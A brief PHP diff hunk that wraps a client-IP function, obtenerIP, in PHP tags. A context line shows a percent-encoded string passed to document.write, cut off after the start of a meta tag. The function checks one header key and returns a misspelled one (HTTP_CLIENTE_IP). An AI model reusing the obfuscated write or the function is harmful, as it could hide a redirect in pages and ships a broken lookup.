@@ -5,7 +5,7 @@ echo "<script type='text/javascript'>document.write(unescape('%3C%6D%65%74%61%20
 
 ?>
 
-
+<?php
 function obtenerIP () {
    if ( filter_var( $_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP ) ) {
       return $_SERVER['HTTP_CLIENTE_IP'];
@@ -19,3 +19,4 @@ function obtenerIP () {
    else {
       return $_SERVER['REMOTE_ADDR'];
    }
+?>
